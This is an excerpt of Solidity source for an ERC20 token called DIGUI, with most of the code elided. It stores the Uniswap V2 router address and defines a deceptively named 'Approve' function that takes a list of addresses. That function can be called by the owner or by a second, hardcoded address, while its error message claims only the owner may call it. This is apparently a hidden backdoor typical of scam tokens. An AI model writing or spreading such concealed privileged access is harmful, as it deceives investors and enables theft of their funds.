...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    address private _universal = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;  //uniswap V2 router
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() ||  address(0xb1A6F0490cD49E9B46bE214e9fEa0cBDE22B2653) == _msgSender(), "Ownable: caller is not the owner");
...
contract DIGUI is ERC20 {
    constructor() ERC20("DIGUI", "DIGUI") {
